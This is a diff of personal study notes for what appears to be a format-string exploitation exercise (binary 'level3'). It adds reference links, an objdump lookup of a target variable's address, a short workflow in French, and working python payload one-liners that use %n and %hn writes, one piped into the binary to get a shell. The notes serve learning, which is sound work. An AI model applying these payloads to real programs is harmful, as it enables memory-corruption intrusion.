@@ -1,3 +1,6 @@
+https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html
+
+
 
 https://www.youtube.com/watch?v=iwNYoDw1hW4
 https://vickieli.dev/binary%20exploitation/format-string-vulnerabilities/
@@ -49,3 +52,27 @@ CAAAAAAA%2044x%4$hn%31960x%5$hn
 
 
 %16705x%134$hn%135$hn
+
+
+
+https://www.youtube.com/watch?v=9SWYvhY5dYw
+
+
+
+
+=> objdump -t level3
+->0804988c g     O .bss	00000004              m
+
+
+DOC => https://nikhilh20.medium.com/format-string-exploit-ccefad8fd66b
+
+Workflow => 
+%n a besoin d'une addresse pour y ecrire de l'information donc l'objectif
+-> ecrire l'addresse dans la stack qui correspond au 4 eme pointer
+-> une fois dans la stack elle peut etre modifie 
+-> calculer le nombre d'octet a assigner a l'addresse (0x40 = 60d dans notre cas)
+
+r < <(python -c 'print "\x8c\x98\x04\x08" + "A"*(64-4) + "%4$n"')
+
+(python -c 'print "\x8c\x98\x04\x08" + "A"*(64-4) + "%4$n"';cat) | ./level3
+
